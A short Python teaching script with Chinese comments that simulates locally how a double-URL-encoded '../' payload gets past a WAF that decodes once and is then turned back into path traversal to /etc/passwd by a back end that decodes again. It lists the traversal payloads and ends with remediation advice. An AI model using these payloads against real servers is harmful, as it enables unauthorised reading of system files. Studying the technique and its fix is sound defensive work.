"""
路径遍历 / 双重 URL 解码绕过 PoC（教学/本地模拟器）。

演示：前端 WAF 只解码一次、后端再解码一次时，双重编码的 ../ 如何
绕过前端的"含 .. 即拦截"规则，最终仍被后端还原成真实遍历。

仅用于授权目标或自有靶场。运行：python url_double_decode.py
"""
import urllib.parse


def frontend_waf(path: str) -> bool:
    """前端 WAF：对请求做一次解码后，若含 '..' 则拦截。"""
    once = urllib.parse.unquote(path)
    return ".." in once


def backend_resolve(path: str) -> str:
    """后端：再做一次解码并"解析"（这里仅演示还原结果）。"""
    twice = urllib.parse.unquote(path)
    return twice


def main():
    cases = [
        "../etc/passwd",                 # 明文，前端直接拦
        "..%2fetc%2fpasswd",             # 单编码，前端解码后即 .. 被拦
        "%2e%2e%2fetc%2fpasswd",         # 同上，一次解码=../ 被拦
        "%252e%252e%252fetc%252fpasswd", # 双重编码：前端解码得 %2e%2e%2f(无..)漏过
    ]
    print("payload                         前端拦截?   后端最终路径")
    print("-" * 60)
    for c in cases:
        blocked = frontend_waf(c)
        final = backend_resolve(c)
        print(f"{c:<32} {'拦' if blocked else '漏':<8}   {final}")

    print("\n关键：%252e%252e%252f 经前端一次解码变成 %2e%2e%2f（不含 '..'）→ 漏过；"
          "后端二次解码变成 ../ → 真实遍历。")
    print("修复：前端与后端必须使用一致的、且仅一次的规范化解码；"
          "用白名单路径 + 规范化后做前缀校验，禁止 '..'。")


if __name__ == "__main__":
    main()
